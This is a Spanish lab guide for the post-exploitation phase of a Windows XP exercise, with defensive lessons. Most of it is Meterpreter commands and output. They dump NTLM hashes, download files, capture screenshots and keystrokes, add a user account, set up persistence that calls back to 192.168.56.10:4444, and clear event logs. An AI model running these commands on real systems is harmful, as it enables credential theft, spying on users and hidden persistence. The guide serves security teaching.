# Fase 6 — Post-explotación (evidencia del impacto real)

> **Objetivo:** demostrar **qué ocurre cuando la vulnerabilidad toma el control** del Windows XP. Esta es la parte del taller que hace tangible el riesgo: con una sesión SYSTEM, el atacante puede leer datos, robar credenciales, espiar al usuario y persistir en el equipo.

> Todo lo siguiente se hace **únicamente** sobre la VM de laboratorio. Es material de demostración del impacto para el informe, no una guía de ataque.

---

## 6.1 Reconocimiento interno del sistema comprometido

Desde la sesión Meterpreter:

```
meterpreter > sysinfo            # datos del SO
meterpreter > getuid             # confirma SYSTEM
meterpreter > ipconfig           # interfaces de red internas
meterpreter > route              # tabla de enrutamiento (pivoting potencial)
meterpreter > ps                 # procesos en ejecución
```

**Lección:** el atacante ya "ve" el equipo desde dentro, como si estuviera sentado frente a él.

---

## 6.2 Robo de credenciales (volcado de hashes)

El impacto más grave: extraer las contraseñas de todas las cuentas locales.

```
meterpreter > hashdump
```

Salida (ejemplo con hashes de laboratorio):

```
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404ee...:...:::
```

Estos hashes NTLM pueden crackearse offline (p. ej. con `john` o `hashcat`) o reutilizarse en ataques *pass-the-hash*.

> **Lección:** una vez comprometido un equipo, **todas las credenciales almacenadas en él se consideran comprometidas**. Por eso tras un incidente se fuerza el cambio masivo de contraseñas.

En el informe, **nunca** incluyas los hashes reales completos: enmascáralos (`aad3b4...`).

---

## 6.3 Acceso y exfiltración de archivos

El atacante puede navegar el disco y robar archivos:

```
meterpreter > pwd
meterpreter > cd "C:\\Documents and Settings"
meterpreter > ls
meterpreter > download "C:\\Documents and Settings\\Administrador\\Escritorio\\confidencial.txt" ./loot/
```

> **Lección:** la confidencialidad cae por completo. Cualquier documento del equipo puede salir de la organización.

---

## 6.4 Espionaje del usuario

Con SYSTEM se puede observar lo que hace la víctima en tiempo real:

```
meterpreter > screenshot                 # captura la pantalla actual
meterpreter > idletime                    # cuánto lleva inactivo el usuario
```

Y, migrando a un proceso interactivo, registrar pulsaciones de teclado:

```
meterpreter > migrate -N explorer.exe     # migra a un proceso estable del usuario
meterpreter > keyscan_start               # inicia captura de teclado
meterpreter > keyscan_dump                # vuelca lo tecleado
meterpreter > keyscan_stop
```

> **Lección:** se pierde toda privacidad. Contraseñas tecleadas, mensajes, todo queda expuesto.

---

## 6.5 Control del equipo como si fuera propio

```
meterpreter > shell
Microsoft Windows XP [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32> whoami
nt authority\system

C:\WINDOWS\system32> net user            # listar cuentas
C:\WINDOWS\system32> net user soporte P@ss2026 /add    # crear cuenta (demostrativo)
```

> **Lección:** el atacante ejecuta comandos con control total. Crear usuarios, instalar software, apagar el equipo: cualquier cosa.

Para salir de la shell de Windows y volver a Meterpreter: `exit`.

---

## 6.6 Persistencia (cómo el atacante se "queda")

Un atacante real instala un mecanismo para volver aunque se reinicie el equipo. En el laboratorio se demuestra el concepto para entender por qué un incidente no se resuelve solo "cerrando la sesión":

```
meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.56.10
```

(Versiones recientes de Metasploit usan módulos `post/windows/manage/persistence_*`.)

> **Lección:** por eso, tras un compromiso, no basta con reiniciar: hay que **reconstruir** el sistema desde una imagen limpia. Aquí es donde revertirás al **snapshot** al terminar la demostración.

---

## 6.7 Borrado de huellas (concepto)

El atacante intentará borrar los registros para no ser detectado:

```
meterpreter > clearev          # limpia los Event Logs de Windows
```

> **Lección para la defensa:** por esto los logs deben enviarse **en tiempo real a un servidor externo (SIEM)**; si solo viven en el equipo atacado, el atacante los borra.

---

## 6.8 Cierre seguro de la demostración

1. Detén cualquier captura activa (`keyscan_stop`).
2. Elimina los artefactos creados (usuario de prueba, archivos subidos).
3. Cierra la sesión: `meterpreter > exit`.
4. **Revierte la VM objetivo al snapshot limpio.**

---

## 6.9 Evidencia a guardar

- `06-hashdump.png` — volcado de hashes (**enmascarado** en el informe).
- `06-screenshot-victima.png` — captura de la pantalla de la víctima.
- `06-shell-system.png` — shell de Windows con `whoami = system`.
- `06-persistencia.png` — concepto de persistencia.

---

## Resumen del impacto demostrado (para el informe)

| Dimensión (CIA) | ¿Comprometida? | Evidencia |
|-----------------|----------------|-----------|
| **Confidencialidad** | Total | Lectura/exfiltración de archivos, hashes |
| **Integridad** | Total | Creación de usuarios, ejecución de comandos |
| **Disponibilidad** | Total | Capacidad de apagar/alterar el sistema |

---

## Checklist de la fase

- [ ] Reconocimiento interno realizado.
- [ ] Impacto en Confidencialidad, Integridad y Disponibilidad demostrado.
- [ ] Evidencias capturadas (con datos sensibles enmascarados).
- [ ] Artefactos de prueba eliminados.
- [ ] VM revertida al snapshot.

➡️ Continúa con [`07-remediacion.md`](07-remediacion.md)
